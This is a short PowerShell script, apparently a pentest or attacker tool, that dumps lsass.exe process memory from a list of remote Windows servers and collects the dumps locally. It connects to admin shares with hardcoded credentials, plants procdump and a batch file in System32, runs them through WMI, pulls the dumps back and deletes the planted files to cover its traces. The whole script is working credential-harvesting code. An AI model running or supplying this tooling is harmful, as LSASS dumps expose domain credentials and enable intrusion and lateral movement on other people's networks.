# author : 0xnnt and Google :)
# date   : May 2015
# this little script will collect all lsass.exe dump files from remote computers.
# CONSTANTS
$pdump = "C:\procdump.exe"
$username = "domain\username"
$password = "password"
$enc_pass = convertto-securestring $password -asplaintext -force 
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $enc_pass 
$remote_dump_name = "lsass.dmp"
# List of servers to execute command
$servers ="SERVER1","SERVER2"


#Initializing 
New-Item -ItemType directory -Path "$env:Temp\output"  -Force


Function ExecuteDumping($server){
    # mount remote drive
    $free_drive = ls function:[d-z]: -n | ?{ !(test-path $_) } | random
    net use $free_drive "\\$server\c$" $password "/user:$username"

    # copy procdump to remote system32
    Copy-Item $pdump "$free_drive\Windows\System32\pdump.exe" -Force

    # create .bat on remote target for executing 
    "procdump.exe -accepteula -ma lsass.exe $remote_dump_name 2>&1" | Out-File -Encoding ASCII "$free_drive\Windows\System32\pdump.bat" -Force

    Invoke-WMIMethod -Credential $cred -Class Win32_Process -Computername $server -Name Create -ArgumentList "C:\Windows\System32\pdump.bat" | Select ProcessId | Out-String
    net use $free_drive /del /y
}


foreach ($server in $servers)
    {
        ExecuteDumping($server)
        }


# Get dump files from servers to local
Function  GetBackFiles($server) 
{

    $free_drive = ls function:[d-z]: -n | ?{ !(test-path $_) } | random
    net use $free_drive "\\$server\c$" $password "/user:$username"

    Move-Item "$free_drive\Windows\System32\$remote_dump_name" "C:\Windows\Temp\vmware-imc\ls\$server.dmp"
    
    
    # Cleaning 
    del "$free_drive\Windows\System32\pdump.exe" 
    del "$free_drive\Windows\System32\$remote_dump_name"
    del "$free_drive\Windows\System32\pdump.bat"
    net use $free_drive /del /y
}


foreach ($server in $servers)
    {
        GetBackFiles($server)
    }
